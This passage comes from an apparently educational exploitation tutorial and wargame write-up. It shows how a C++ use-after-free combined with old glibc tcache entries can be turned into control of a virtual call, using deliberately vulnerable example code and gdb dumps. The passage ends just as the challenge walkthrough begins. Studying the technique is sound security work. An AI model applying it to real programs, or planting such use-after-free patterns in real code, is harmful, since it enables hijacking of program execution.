&lt;p&gt;Because we allocated and free’d some strings of the same usable size as the vector’s internal structure, the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache_entry-&amp;gt;next&lt;/code&gt; at RAX (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6ee7a0&lt;/code&gt;) should point to one of those free’d entries:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/4gx 0x00000000006ee7f0
0x6ee7f0:       0x0000000000000000    0x00000000006dc1d0
0x6ee800:       0x4141414141414141    0x4141414141414141
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The hex-encoded “A”s mean we were correct. This is the final tcache entry in this bin.&lt;/p&gt;

&lt;p&gt;The important aspect here is that you have a way to control a buffer’s allocation size so you can match it against the target (here, the vector’s internal structure size). You can use previously discussed techniques to find it and adjust the string allocation. For example, the following patch to the code used in this section would work for a one-item vector.&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//printf(&quot;%lu\n&quot;, malloc_usable_size(static_cast&amp;lt;void*&amp;gt;(v.data())));  // 24&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CHAR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You’ll notice the first sixteen “A”s were wiped out by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache_entry&lt;/code&gt; data, leaving only the final eight:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/4gx $rax
0x6f2730:       0x00000000006f2750    0x00000000006e01d0
0x6f2740:       0x0000000000000000    0x0000000000000021

(gdb) x/4gx 0x00000000006f2750
0x6f2750:       0x0000000000000000    0x00000000006e01d0
0x6f2760:       0x4141414141414141    0x0000000000000411
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It should be obvious from the disassembly, but at this time, the strings provide no real advantage for exploitation. This is due entirely to the fact that we’re just pulling a long unsigned int and printing its value (ie, the tcache entry).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000400cba &amp;lt;+205&amp;gt;:   mov    rax,QWORD PTR [rax]
   0x0000000000400cbd &amp;lt;+208&amp;gt;:   mov    rsi,rax
   ...
   0x0000000000400ccc &amp;lt;+223&amp;gt;:   call   0x428ff0 &amp;lt;printf&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we could trick the compiler into reading data from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache_entry-&amp;gt;next+16&lt;/code&gt;, we might gain some advantage for exploitation: either through a read or an execution.&lt;/p&gt;

&lt;h1 id=&quot;the-benefits-of-vtables&quot;&gt;The benefits of vtables&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Our primitive has evolved from a simple UAF into an arbitrary virtual call&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So far, we’ve considered two different types of code: that which uses virtual functions, and code that uses vulnerable tcache versions. Let’s combine the two concepts:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_something&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Item&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{});&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;do_something&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;do_something&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It will crash just before the virtual call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_something&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/i $pc
=&amp;gt; 0x400cf5 &amp;lt;main()+231&amp;gt;:       mov    rdx,QWORD PTR [rdx]

(gdb) x/gx $rax
0x6f2b80:       0x0000000000000000

(gdb) disas main
   0x0000000000400cea &amp;lt;+220&amp;gt;:   call   0x400e2e &amp;lt;vector::operator[]&amp;gt;
   0x0000000000400cef &amp;lt;+225&amp;gt;:   mov    rax,QWORD PTR [rax]
   0x0000000000400cf2 &amp;lt;+228&amp;gt;:   mov    rdx,QWORD PTR [rax]
=&amp;gt; 0x0000000000400cf5 &amp;lt;+231&amp;gt;:   mov    rdx,QWORD PTR [rdx]
   ...
   0x0000000000400cfb &amp;lt;+237&amp;gt;:   call   rdx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is no surprise given the data we looked at earlier. Zero is the value at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6f2750&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/4gx $rax
0x6f2730:       0x00000000006f2750    0x00000000006e01d0
0x6f2740:       0x0000000000000000    0x0000000000000021

(gdb) x/4gx 0x00000000006f2750
0x6f2750:       0x0000000000000000    0x00000000006e01d0
0x6f2760:       0x4141414141414141    0x0000000000000411
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can vizualize it like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rax, [rax]  // *item
rdx, [rax]  // item-&amp;gt;vtable
rdx, [rdx]  // item-&amp;gt;vtable-&amp;gt;do_something &amp;lt;fails to dereference 0x0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, it fails when trying to dereference &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_something&lt;/code&gt;. This is completely understandable because we are, again, exploiting a use-after-free condition. The “vtable” is really pointing to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache-&amp;gt;next&lt;/code&gt; pointer, which contains the sixteen bytes needed for a tcache entry followed by any extra data.&lt;/p&gt;

&lt;p&gt;Recall that tcache entries are all singly linked lists, whose first value will always point to another item of the same bin size. To (&lt;em&gt;sort of&lt;/em&gt;) complete the vtable dereference, we can allocate and remove another string buffer whose size will also land in the same bin.&lt;/p&gt;

&lt;p&gt;To keep it simple, let’s use an array of two names and perform the same allocation and deallocation operations on each element:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The extra &lt;em&gt;free&lt;/em&gt;‘d string buffer gives us one more node to traverse in the tcache list:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/5i $pc
=&amp;gt; 0x400d28 &amp;lt;main()+282&amp;gt;:       mov    rax,QWORD PTR [rax]
   0x400d2b &amp;lt;main()+285&amp;gt;:       mov    rdx,QWORD PTR [rax]
   0x400d2e &amp;lt;main()+288&amp;gt;:       mov    rdx,QWORD PTR [rdx]
   0x400d31 &amp;lt;main()+291&amp;gt;:       mov    rdi,rax
   0x400d34 &amp;lt;main()+294&amp;gt;:       call   rdx
   
(gdb) x/4gx $rax
0x6f2750:       0x00000000006f2ba0    0x00000000006e01d0
0x6f2760:       0x0000000000000000    0x0000000000000411

(gdb) x/4gx 0x00000000006f2ba0
0x6f2ba0:       0x00000000006f2b80    0x00000000006e01d0
0x6f2bb0:       0x0041414141414141    0x000000000000f451

(gdb) x/4gx 0x00000000006f2b80
0x6f2b80:       0x0000000000000000    0x00000000006e01d0
0x6f2b90:       0x0041414141414141    0x0000000000000021
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This completes the dereference path, but points it to data that we almost control. Here, it will make it to CALL RDX, but RDX will be zero, the value of 0x6f2b80.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()

(gdb) bt
#0  0x0000000000000000 in ?? ()
#1  0x0000000000400d36 in main ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recall from the earlier section on virtual functions that the vtable may adjust the target quadword that is dereferenced. If we add more virtual functions, we should be able to gain some control over execution.&lt;/p&gt;

&lt;p&gt;Right now, the vtable looks like this, because it has one virtual function:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset  target function
------  ----------------
 0x0     do_something
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s redefine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item&lt;/code&gt; to include one new virtual function:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_something&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This should adjust the vtable to look like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset  target function
------  ----------------
 0x0     foo
 0x8     do_something
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Implement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item::foo&lt;/code&gt; however you want. Then, compile it, and observe that an offset of 0x8 is added to the virtual call instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000400d2c &amp;lt;+286&amp;gt;:   mov    rax,QWORD PTR [rax]
   0x0000000000400d2f &amp;lt;+289&amp;gt;:   mov    rdx,QWORD PTR [rax]
   0x0000000000400d32 &amp;lt;+292&amp;gt;:   add    rdx,0x8
   0x0000000000400d36 &amp;lt;+296&amp;gt;:   mov    rdx,QWORD PTR [rdx]
   ...
   0x0000000000400d3c &amp;lt;+302&amp;gt;:   call   rdx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let it run and let it crash:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Program received signal SIGSEGV, Segmentation fault.
0x00000000006e01d0 in ?? ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, instead of failing at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache_entry-&amp;gt;next&lt;/code&gt;, it fails at a fake &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache_entry-&amp;gt;key&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/4gx 0x00000000006f2b80
0x6f2b80:       0x0000000000000000    0x00000000006e01d0
0x6f2b90:       0x0041414141414141    0x0000000000000021
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, this matches what we expected to happen.&lt;/p&gt;

&lt;p&gt;Now, let’s add a final trivial virtual function, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar&lt;/code&gt;, to complete the vtable and gain some control over the execution:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset  target function
------  ----------------
 0x0     foo
 0x8     bar
0x10     do_something
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CALL RDX now points to whatever we inserted in the buffer earlier:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Program received signal SIGSEGV, Segmentation fault.
0x0000000000400d3c in main ()
42        v[0]-&amp;gt;do_something();

(gdb) x/i $pc
=&amp;gt; 0x400d3c &amp;lt;main()+302&amp;gt;:       call   rdx

(gdb) print/x $rdx
$1 = 0x41414141414141
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the data we added to the string buffers was something more useful, like the address of an unreachable function, that function would execute here.&lt;/p&gt;

&lt;h1 id=&quot;wargames-writeup&quot;&gt;Wargames Writeup&lt;/h1&gt;

&lt;p&gt;Let’s jump into &lt;a href=&quot;https://wargames.ret2.systems/level/charxpost_destructors#&quot;&gt;the challenge&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Use static analysis to make the following observations:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Charger&lt;/code&gt; class nests a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChargePortManager&lt;/code&gt;, which invokes a callback function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;on_port_disconnected&lt;/code&gt;. This is nearly identical to the dangerous behaviors described in the blog posts.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Charger&lt;/code&gt; instance is declared in global scope. This will have a similar behavior to the writeups’ explanation of using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static&lt;/code&gt; versions in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; scope. Its destructor will be called in a scope that precedes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;, so any weird behaviors won’t be obvious in static analysis.&lt;/li&gt;
  &lt;li&gt;There is an opportunity to create strings of an arbitrary buffer. These are the “names” of the two charge plug types. We can try to control data when these values are created (with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new&lt;/code&gt;) and to send them to the tcache when they are free’d (with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delete&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;Although there’s no clear confirmation here, we can see references to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc 2.27&lt;/code&gt; in output from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmmap&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info proc mappings&lt;/code&gt;, so it’s reasonable to wonder if it’s using an older tcache version.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Start the program and don’t do anything (select option 6). Notice it exits gracefully.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Choice: 
&amp;gt;&amp;gt; 6
